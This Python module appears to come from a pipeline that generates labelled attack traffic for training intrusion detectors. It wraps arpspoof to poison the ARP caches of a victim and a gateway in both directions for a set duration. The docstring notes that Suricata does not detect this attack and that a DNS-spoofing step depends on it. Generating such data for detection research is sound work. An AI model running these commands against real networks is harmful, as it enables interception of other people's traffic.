"""ARP spoofing attack (FR-2.5, §5.4.3). Wraps arpspoof (dsniff).

NOTE: this attack is deliberately NOT detected by Suricata (§5.4.3 — ARP sits
below the IP layer). dns_spoof.py depends on this attack already poisoning the
victim's ARP cache so the attacker is on-path; the two are not auto-chained.
"""

import subprocess
import time
from pathlib import Path

from training.selfcollected.attacks.common.runner import (
    AttackRecord, check_tools, run_attack,
)


def build_commands(interface: str, victim_ip: str, gateway_ip: str) -> tuple[list[str], list[str]]:
    poison_victim = ["arpspoof", "-i", interface, "-t", victim_ip, gateway_ip]
    poison_gateway = ["arpspoof", "-i", interface, "-t", gateway_ip, victim_ip]
    return poison_victim, poison_gateway


def parse_extra_args(extra: list[str]) -> dict:
    parsed = {"gateway_ip": None, "interface": None, "duration": 60}
    it = iter(extra)
    for arg in it:
        if arg == "--gateway-ip":
            parsed["gateway_ip"] = next(it)
        elif arg == "--interface":
            parsed["interface"] = next(it)
        elif arg == "--duration":
            parsed["duration"] = float(next(it))
    if parsed["gateway_ip"] is None or parsed["interface"] is None:
        raise ValueError("arp_spoof requires --gateway-ip and --interface")
    return parsed


def run(
    victim_ip: str,
    attacker_ip: str,
    out_dir: Path,
    gateway_ip: str,
    interface: str,
    duration: float = 60,
    dry_run: bool = False,
) -> AttackRecord:
    params = {"gateway_ip": gateway_ip, "interface": interface, "duration": duration}

    def body():
        check_tools(["arpspoof"])
        cmd_victim, cmd_gateway = build_commands(interface, victim_ip, gateway_ip)
        procs: list[subprocess.Popen] = []
        try:
            procs.append(subprocess.Popen(cmd_victim))
            procs.append(subprocess.Popen(cmd_gateway))
            time.sleep(duration)
        finally:
            for proc in procs:
                try:
                    proc.terminate()
                except Exception:
                    pass
            for proc in procs:
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    try:
                        proc.kill()
                        proc.wait()
                    except Exception:
                        pass
                except Exception:
                    pass

    return run_attack("arp_spoof", "arpspoof", attacker_ip, victim_ip, out_dir, params, body, dry_run)
